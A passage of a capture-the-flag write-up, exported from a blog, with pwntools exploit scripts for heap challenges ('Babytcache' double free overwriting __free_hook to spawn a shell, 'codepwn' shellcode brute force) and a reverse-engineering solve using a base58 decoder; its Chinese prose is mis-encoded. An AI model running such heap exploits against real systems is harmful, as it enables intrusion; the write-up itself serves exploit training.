class="built_in">log</span>.success(<span class="string">"system: "</span> + hex(<span class="keyword">system</span>))</span><br><span class="line">    <span class="built_in">log</span>.success(<span class="string">"binsh: "</span> + hex(binsh))</span><br><span class="line">    <span class="built_in">log</span>.success(<span class="string">"libc: "</span> + hex(libc))</span><br><span class="line">    sh.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    pwn(<span class="string">"47.110.227.208"</span>,<span class="number">10002</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114506-706c344e-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114506-706c344e-a457-1.png" alt="img"></a></p><h3 id="Babytcache"><a href="#Babytcache" class="headerlink" title="Babytcache"></a>Babytcache</h3><p>checksec å¯ä»¥çœ‹åˆ°ç¨‹åºæ²¡æœ‰å¼€PIE,åŒæ—¶bssä¸­å­˜æ”¾äº†_IO_2_1_stdout_çš„åœ°å€,å¹¶ä¸”libc2.27æœ‰double free,æ‰€ä»¥æ€è·¯å°±å¾ˆæ˜ç¡®äº†.æœ‰äº†double freeå°±å¯ä»¥malloc 2 everywhere,æ‰€ä»¥è¿™æ ·ä¸€çš„éš¾ç‚¹åœ¨äºå¦‚ä½•leak libc,é€šè¿‡double free,å¯ä»¥è®©fdæŒ‡å‘_IO_2_1<em>stdout</em>,ä»è€Œmalloc 2 _IO_2_1<em>stdout</em>,ä»è€Œä¿®æ”¹write_baseæ¥leak libc,ä¹‹åå†double freeå»ä¿®æ”¹free_hookä¸ºsystem,å»freeä¸€ä¸ª/bin/shå°±å¯ä»¥äº†</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">libc=ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"><span class="keyword">sh</span>=remote(<span class="string">"47.110.227.208"</span>,<span class="number">10006</span>)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(size,content):</span><br><span class="line">    <span class="keyword">sh</span>.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your size:'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(size))</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your message:'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.send(content)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">def add2(size,content):</span><br><span class="line">    <span class="keyword">sh</span>.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your size:'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(size))</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your message:'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.send(content)</span><br><span class="line">    #sh.recvuntil(<span class="string">'Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">def <span class="keyword">delete</span>(<span class="built_in">index</span>):</span><br><span class="line">    <span class="keyword">sh</span>.sendline(<span class="string">'2'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input the index: '</span>)</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(<span class="built_in">index</span>))</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,<span class="string">'a\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,<span class="string">'a\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,<span class="string">'a\n'</span>)</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,p64(<span class="number">0</span>x0000000000602020)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,p64(<span class="number">0</span>x0000000000602020)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    add2(<span class="number">0</span>x100,p64(<span class="number">0</span>xfbad1880)+p64(<span class="number">0</span>x0)*<span class="number">3</span>+<span class="string">'\x20\n'</span>)</span><br><span class="line">    libc_base=u64(<span class="keyword">sh</span>.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)-<span class="number">0</span>x3eb780</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"libc_base -&gt; "</span> + hex(libc_base)</span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    <span class="built_in">system</span>=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x10,<span class="string">'/bin/sh\x00\n'</span>) # <span class="built_in">index</span> <span class="number">7</span></span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x20,<span class="string">'\n'</span>) # <span class="built_in">index</span> <span class="number">8</span></span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">8</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x20,p64(free_hook)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x20,p64(free_hook)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x20,p64(<span class="built_in">system</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712115336-a027c15c-a458-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712115336-a027c15c-a458-1.png" alt="img"></a></p><h3 id="codepwn"><a href="#codepwn" class="headerlink" title="codepwn"></a>codepwn</h3><p>é€šè¿‡é€†å‘å¯ä»¥å‘ç°ç¨‹åºå°†flagå­˜å…¥äº†å†…å­˜ä¸­,å¹¶ä¸”æˆ‘ä»¬å¯ä»¥é€‰æ‹©flagå¯¹åº”çš„ä¸‹æ ‡è¿›è¡Œå¯¹æ¯”,å¯æ˜¯4å­—èŠ‚çš„shellcodeæœ‰ç€é™åˆ¶,å¹¶ä¸”v5æ˜¯call shellcodeä¹‹åçš„è¿”å›å€¼,é‚£ä¹ˆå°±å¿…é¡»åœ¨shellcodeä¸­å¯¹raxè¿›è¡Œèµ‹å€¼æ“ä½œ,å¯ä»¥è§‚å¯Ÿåˆ°r9å¯„å­˜å™¨çš„å¤§å°æ˜¯è·Ÿprintfå‡ºæ¥çš„å­—èŠ‚æ•°ç›¸å…³,é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡push r9,pop rax,ret,ä¸‰ä¸ªæ“ä½œæ¥å¯¹raxèµ‹å€¼,è¿›è€Œæ ¹æ®ç¨‹åºæœ€åçš„åˆ¤æ–­æ¥ç¡®è®¤æˆ‘ä»¬çŒœæµ‹çš„flagå¯¹åº”ä¸‹æ ‡çš„é‚£ä¸ªå­—æ¯æ˜¯å¦æ­£ç¡®,æ¥ä¸‹æ¥å°±æ˜¯çˆ†ç ´å°±å®Œäº‹äº†</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'CRITICAL'</span> </span><br><span class="line"></span><br><span class="line">def flag_index(<span class="built_in">index</span>): </span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(<span class="built_in">index</span>)) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def code(code): </span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.send(code) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def name(size,content): </span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'tell me your name size:\n'</span>) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(size)) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your name:\n'</span>) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.sendline(content) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag=<span class="keyword">open</span>(<span class="string">'./pwn4_flag'</span>,<span class="string">'a+'</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">index</span> in <span class="built_in">range</span>(<span class="number">32</span>): </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">0</span>x1,<span class="number">0</span>x7f): </span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>=remote(<span class="string">'47.110.227.208'</span>,<span class="number">10004</span>) </span><br><span class="line"></span><br><span class="line">            #sh=process(<span class="string">'./pwn4'</span>) </span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>.recvuntil(<span class="string">'this is my gift for you, take it!\n'</span>) </span><br><span class="line"></span><br><span class="line">            flag_index(<span class="built_in">index</span>) </span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>.recvuntil(<span class="string">'input your code:\n'</span>) </span><br><span class="line"></span><br><span class="line">            code(<span class="string">'AQX\xC3'</span>) </span><br><span class="line"></span><br><span class="line">            padding=<span class="string">'a'</span>.ljust(i,<span class="string">'a'</span>) </span><br><span class="line"></span><br><span class="line">            name(<span class="number">0</span>x100,padding) </span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>.recvuntil(<span class="string">'Hello are you ready? '</span>+padding+<span class="string">'\n'</span>) </span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>.sendline() </span><br><span class="line"></span><br><span class="line">            info = <span class="keyword">sh</span>.recv() </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>((info).<span class="keyword">find</span>(<span class="string">'bye!'</span>) != -<span class="number">1</span>): </span><br><span class="line"></span><br><span class="line">                <span class="keyword">print</span>  chr(i+<span class="number">0</span>x16) </span><br><span class="line"></span><br><span class="line">                flag.<span class="keyword">write</span>(chr(i+<span class="number">0</span>x16)) </span><br><span class="line"></span><br><span class="line">                <span class="keyword">sh</span>.<span class="keyword">close</span>() </span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span> </span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>: </span><br><span class="line"></span><br><span class="line">                <span class="keyword">sh</span>.<span class="keyword">close</span>() </span><br><span class="line"></span><br><span class="line">except KeyboardInterrup<span class="variable">t:</span> </span><br><span class="line"></span><br><span class="line">    flag.<span class="keyword">close</span>() </span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">excep<span class="variable">t:</span> </span><br><span class="line"></span><br><span class="line">    flag.<span class="keyword">close</span>() </span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712115357-acb3b9d0-a458-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712115357-acb3b9d0-a458-1.png" alt="img"></a></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h3><p>ï¼ˆemmmè¿™ä¸€é¢˜å·æ‡’äº†ï¼‰ï¼Œ<br>é¦–å…ˆåˆ†æä¸»å‡½æ•°<br>é‡Œé¢æœ‰ä¸¤ä¸ªcheckå‡½æ•°ã€‚è¿›å…¥checktimeï¼ˆï¼‰å‡½æ•°ï¼Œå…³é”®ä»£ç æ˜¯è¿™é‡Œï¼Œ</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*(&amp;v5 + i) = rand();</span><br><span class="line">  if ( <span class="number">14766</span> * v11 + <span class="number">18242</span> * v10 + <span class="number">4657</span> * v9 + <span class="number">22453</span> * v8 + <span class="number">7236</span> * v7 + <span class="number">28554</span> * v6 + <span class="number">25606</span> * v5 + <span class="number">12289</span> * v12 == <span class="number">12977737</span></span><br><span class="line">    &amp;&amp; <span class="number">27429</span> * v11 + <span class="number">8015</span> * v10 + <span class="number">16511</span> * v9 + <span class="number">17180</span> * v8 + <span class="number">27141</span> * v7 + <span class="number">31813</span> * v6 + <span class="number">7412</span> * v5 + <span class="number">18249</span> * v12 == <span class="number">15081473</span></span><br><span class="line">    &amp;&amp; <span class="number">2846</span> * v11 + <span class="number">28353</span> * v10 + <span class="number">19864</span> * v9 + <span class="number">27377</span> * v8 + <span class="number">9006</span> * v7 + <span class="number">13657</span> * v6 + <span class="number">19099</span> * v5 + <span class="number">25835</span> * v12 == <span class="number">13554960</span></span><br><span class="line">    &amp;&amp; <span class="number">1078</span> * v11 + <span class="number">5007</span> * v10 + <span class="number">6568</span> * v9 + <span class="number">23034</span> * v8 + <span class="number">10150</span> * v7 + <span class="number">22949</span> * v6 + <span class="number">32646</span> * v5 + <span class="number">15255</span> * v12 == <span class="number">11284005</span></span><br><span class="line">    &amp;&amp; <span class="number">8010</span> * v11 + <span class="number">15430</span> * v10 + <span class="number">6657</span> * v9 + <span class="number">1009</span> * v8 + <span class="number">25691</span> * v7 + <span class="number">15960</span> * v6 + <span class="number">19493</span> * v5 + <span class="number">29491</span> * v12 == <span class="number">10759932</span></span><br><span class="line">    &amp;&amp; <span class="number">4605</span> * v11 + <span class="number">14468</span> * v10 + <span class="number">5017</span> * v9 + <span class="number">12805</span> * v8 + <span class="number">22973</span> * v7 + <span class="number">30584</span> * v6 + <span class="number">12620</span> * v5 + <span class="number">32085</span> * v12 == <span class="number">12085266</span></span><br><span class="line">    &amp;&amp; <span class="number">7478</span> * v11 + <span class="number">6524</span> * v10 + <span class="number">25994</span> * v9 + <span class="number">16215</span> * v8 + <span class="number">12864</span> * v7 + <span class="number">20574</span> * v6 + <span class="number">8882</span> * v5 + <span class="number">14794</span> * v12 == <span class="number">11323393</span></span><br><span class="line">    &amp;&amp; <span class="number">15263</span> * v11 + <span class="number">8821</span> * v10 + <span class="number">25489</span> * v9 + <span class="number">9598</span> * v8 + <span class="number">26847</span> * v7 + <span class="number">5175</span> * v6 + <span class="number">6515</span> * v5 + <span class="number">27411</span> * v12 == <span class="number">11677607</span> )</span><br><span class="line">  &#123;</span><br></pre></td></tr></table></figure><p>ä¸€å…±8ä½å­—ç¬¦ï¼ŒçŒœæµ‹å‰5ä½ä¸ºflag{ç„¶åè§£ä¸ªæ–¹ç¨‹ï¼ˆä¹Ÿå¯ä»¥ç›´æ¥éå†åä¸‰ä¸ªå­—ç¬¦çš„æ‰€æœ‰å¯èƒ½ï¼Œæ‰¾åˆ°ç¬¦åˆåˆ¤æ–­æ¡ä»¶çš„ï¼‰<br>å¾—åˆ° flag{Th3<br>ç„¶åæ¥åˆ°å…³é”®çš„checkå‡½æ•°ï¼Œçœ‹åˆ°è¿™é‡Œï¼Œ</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( j = 0; !v12[j]; ++j )</span><br><span class="line">      ;</span><br><span class="line">   <span class="built_in"> if </span>( j &gt;= v11 )</span><br><span class="line">      break;</span><br><span class="line">    v9 = 0;</span><br><span class="line">    while ( j &lt; v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = (v9 &lt;&lt; 8) + v12[j];</span><br><span class="line">      v12[j] = v1 / 58;</span><br><span class="line">      v9 = v1 % 58;</span><br><span class="line">      ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    v2 = v5++;</span><br><span class="line">    s[v2] = v9;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å†åŠ ä¸Šç”¨æ¥å–å€¼çš„table 123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxy<br>æ„è¯†åˆ°è¿™æ˜¯å¯èƒ½æ˜¯ä¸ªæ”¹å˜å¯†ç è¡¨çš„base58ç¼–ç å˜å½¢ï¼Œäºæ˜¯å·æ‡’ï¼Œç™¾åº¦æ‰¾äº†ä¸€ä¸ªbase58çš„ç¼–ç è§£ç è„šæœ¬ï¼Œæ”¹å˜å¯†ç è¡¨ï¼Œ</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$encode = <span class="string">"fQcoNZxMvNxAVW7UJh5vQNyyuaphLAGo8g"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>.$encode;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$decode = base58_decode($encode);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>.$decode;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">base58_encode</span><span class="params">($string)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $alphabet = <span class="string">'123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ'</span>;</span></span><br><span class="line"><span class="php">    $base = strlen($alphabet);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (is_string($string) === <span class="keyword">false</span> || !strlen($string)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $bytes = array_values(unpack(<span class="string">'C*'</span>, $string));</span></span><br><span class="line"><span class="php">    $decimal = $bytes[<span class="number">0</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">for</span> ($i = <span class="number">1</span>, $l = count($bytes); $i &lt; $l; ++$i) &#123;</span></span><br><span class="line"><span class="php">        $decimal = bcmul($decimal, <span class="number">256</span>);</span></span><br><span class="line"><span class="php">        $decimal = bcadd($decimal, $bytes[$i]);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $output = <span class="string">''</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">while</span> ($decimal &gt;= $base) &#123;</span></span><br><span class="line"><span class="php">        $div = bcdiv($decimal, $base, <span class="number">0</span>);</span></span><br><span class="line"><span class="php">        $mod = bcmod($decimal, $base);</span></span><br><span class="line"><span class="php">        $output .= $alphabet[$mod];</span></span><br><span class="line"><span class="php">        $decimal = $div;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($decimal &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="php">        $output .= $alphabet[$decimal];</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $output = strrev($output);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> (string) $output;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">base58_decode</span><span class="params">($base58)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $alphabet = <span class="string">'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'</span>;</span></span><br><span class="line"><span class="php">    $base = strlen($alphabet);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (is_string($base58) === <span class="keyword">false</span> || !strlen($base58)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $indexes = array_flip(str_split($alphabet));</span></span><br><span class="line"><span class="php">    $chars = str_split($base58);</span></span><br><span class="line"><span class="php">    <span class="keyword">foreach</span> ($chars <span class="keyword">as</span> $char) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">isset</span>($indexes[$char]) === <span class="keyword">false</span>) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $decimal = $indexes[$chars[<span class="number">0</span>]];</span></span><br><span class="line"><span class="php">    <span class="keyword">for</span> ($i = <span class="number">1</span>, $l = count($chars); $i &lt; $l; ++$i) &#123;</span></span><br><span class="line"><span class="php">        $decimal = bcmul($decimal, $base);</span></span><br><span class="line"><span class="php">        $decimal = bcadd($decimal, $indexes[$chars[$i]]);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $output = <span class="string">''</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">while</span> ($decimal &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="php">        $byte = bcmod($decimal, <span class="number">256</span>);</span></span><br><span class="line"><span class="php">        $output = pack(<span class="string">'C'</span>, $byte).$output;</span></span><br><span class="line"><span class="php">        $decimal = bcdiv($decimal, <span class="number">256</span>, <span class="number">0</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> $output;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>è§£ç å¾—åˆ°<br>sEcondBe5tTime1s_n0w}<br>flagåˆ°æ‰‹<br>åæ¥å‘ç°ï¼Œæ‹¿è¿™ç¨‹åºå»è¿è¡Œï¼Œåªè¦flagçš„åé¢ä¸€åŠï¼Œä¹Ÿèƒ½è¿‡ï¼Œæ‰€ä»¥ä¸€å¼€å§‹å…¶å®æ˜¯å¿½ç•¥äº†è¿™ä¸ªcheck timeï¼ˆï¼‰å‡½æ•°ã€‚ã€‚ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
